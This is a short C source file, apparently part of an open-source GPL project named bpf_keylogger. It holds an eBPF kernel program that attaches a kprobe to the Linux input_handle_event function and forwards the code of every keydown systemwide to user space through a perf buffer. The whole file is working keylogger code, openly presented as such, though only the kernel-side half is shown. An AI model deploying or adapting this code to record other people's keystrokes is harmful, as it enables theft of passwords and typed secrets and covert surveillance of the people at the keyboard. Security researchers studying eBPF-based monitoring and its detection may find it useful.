/*
    bpf_keylogger: Log key presses and mouse button events systemwide using eBPF
    Copyright (C) 2019  William Findlay

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#include <linux/input.h>
#include <uapi/linux/input-event-codes.h>

#include "src/bpf/bpf_program.h"
#include "src/bpf/helpers.h"

/* BPF maps below this line -------------------------------------- */

BPF_PERF_OUTPUT(keypresses);

/* BPF programs below this line ---------------------------------- */

/* https://github.com/torvalds/linux/blob/master/drivers/input/input.c */
int kprobe__input_handle_event(struct pt_regs *ctx, struct input_dev *dev,
			       unsigned int type, unsigned int code, int value)
{
    /* Keypress event */
    struct bkl_key_event kev = {};

    /* Filter keydown events */
    if (type == EV_KEY && value)
    {
#ifdef BKL_DEBUG
        bpf_trace_printk("key code %u\n", code);
#endif

        kev.code = code;
        keypresses.perf_submit(ctx, &kev, sizeof(kev));
    }

    return 0;
}

/* https://github.com/torvalds/linux/blob/master/drivers/input/input.c */
/* We probably don't have to worry about autorepeats since people don't type that way */
int kprobe__input_repeat_key(struct pt_regs *ctx)
{
#ifdef BKL_DEBUG
    bpf_trace_printk("repeat key!\n");
#endif

    return 0;
}
